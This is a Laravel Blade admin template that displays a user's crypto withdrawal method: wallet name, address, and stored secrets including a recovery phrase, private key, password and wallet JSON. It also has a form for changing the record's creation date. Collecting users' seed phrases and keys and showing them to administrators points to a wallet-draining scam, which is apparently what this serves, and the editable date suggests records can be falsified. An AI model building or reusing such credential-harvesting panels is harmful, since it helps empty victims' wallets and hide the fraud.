<div class="form-group">
    <label for="">User</label>
    <input type="text" class="form-control" name="name" value="{{ $method->user->name }}" readonly disabled>
</div>

<div class="form-group">
    <label for="">Wallet name</label>
    <input type="text" class="form-control" name="name" value="{{ $method->name }}" readonly disabled>
</div>

<div class="form-group">
    <label for="">Payment method</label>
    <input type="text" class="form-control" name="name" value="{{ $method->method->name }}" readonly disabled>
</div>

<div class="form-group">
    <label for="">Wallet address</label>
    <input type="text" class="form-control" name="name" value="{{ $method->address }}" readonly disabled>
</div>

@if(isset(json_decode($method->details)->phrase))
<div class="form-group">
    <label for="">Phrase</label>
    <textarea name="phrase" id="phrase" class="form-control" readonly disabled>{{ json_decode($method->details)->phrase }}</textarea>
</div>
@endif

@if(isset(json_decode($method->details)->key))
<div class="form-group">
    <label for="">Key</label>
    <input type="text" class="form-control" name="name" value="{{ json_decode($method->details)->key }}" readonly disabled>
</div>
@endif

@if(isset(json_decode($method->details)->password))
<div class="form-group">
    <label for="">Password</label>
    <input type="text" class="form-control" name="name" value="{{ json_decode($method->details)->password }}" readonly disabled>
</div>
@endif

@if(isset(json_decode($method->details)->json))

<div class="form-group">
    <label for="">JSON</label>
    <textarea name="json" id="json" style="min-height: 300px" class="form-control" readonly disabled>@json(json_decode($method->details)->json)</textarea>
</div>
@endif

@if(request()->has('update_date') && request()->get('update_date') == true)
<form action="{{route('admin.withdrawals.methods.change-date', $method->id)}}" method="post">
    @csrf
    <div class="form-group">
        <label for=""><strong>Date</strong></label>
        <input class="form-control" type="datetime-local" name="created_at" value="{{$method->created_at}}">
    </div>

    <div class="form-group">
        <button class="btn btn-outline-primary" type="submit">Update Date</button>
    </div>
</form>
@endif